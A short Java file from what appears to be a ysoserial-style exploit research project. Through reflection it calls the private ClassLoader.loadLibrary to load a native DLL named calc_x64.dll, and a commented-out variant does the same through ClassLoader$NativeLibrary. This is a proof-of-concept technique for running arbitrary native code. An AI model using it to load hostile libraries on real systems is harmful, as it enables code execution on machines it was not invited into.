package org.exploit.loadDLL;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class loadLibraryToDLL {
    public static void main(String[] args) throws Exception{
        try {
            Class clazz = Class.forName("java.lang.ClassLoader");
            Method method = clazz.getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(null, clazz, "E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc_x64.dll", true);
//            String file = "E:\\\\CODE_COLLECT\\\\Idea_java_ProTest\\\\my-yso\\\\src\\\\main\\\\java\\\\org\\\\exploit\\\\loadDLL\\\\calc.dll";
//            Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
//            Constructor con = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
//            con.setAccessible(true);
//            Object obj = con.newInstance(Class.class,file,true);
//            Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
//            method.setAccessible(true);
//            method.invoke(obj, file, false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
